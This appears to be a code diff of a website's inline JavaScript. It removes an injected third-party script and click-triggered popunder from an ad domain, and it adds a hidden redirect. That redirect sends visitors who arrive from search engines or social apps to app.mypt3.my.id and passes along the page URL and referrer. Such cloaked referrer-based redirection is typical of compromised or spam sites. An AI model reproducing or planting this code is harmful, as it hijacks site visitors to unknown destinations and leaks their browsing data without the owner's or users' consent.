@@ -1,14 +1,17 @@
-document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://dawnfilthscribble.com/83/6e/67/836e676799d99b9363e12cbc7ff9486d.js"></scr' + 'ipt>');
-type='text/javascript'>
 //<![CDATA[
-	$(document).ready(function()
-	{
-	  $('body').addClass('xepo_ads');
-	});
+    if(document.referrer)
+    {
+    	var cek = document.referrer;
 
-	$(document).on('click','.xepo_ads',function(e)
-	{
-	    $(this).removeClass('xepo_ads');
-	    window.open('https://dawnfilthscribble.com/ncp8y04vj2?key=59badd65781356086f0116a131956f1e','_blank');
-	});
+    	var ars 	= rChoice([
+							'https://app.mypt3.my.id/',
+							]);
+
+				function rChoice(arr) {
+    			return arr[Math.floor(arr.length * Math.random())];
+	}
+
+	//Code arsae client javascript
+	if(['.google.', 'bing.', 'yandex.', 'facebook.', 'yahoo.', 'whatsapp.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+    }
 //]]>
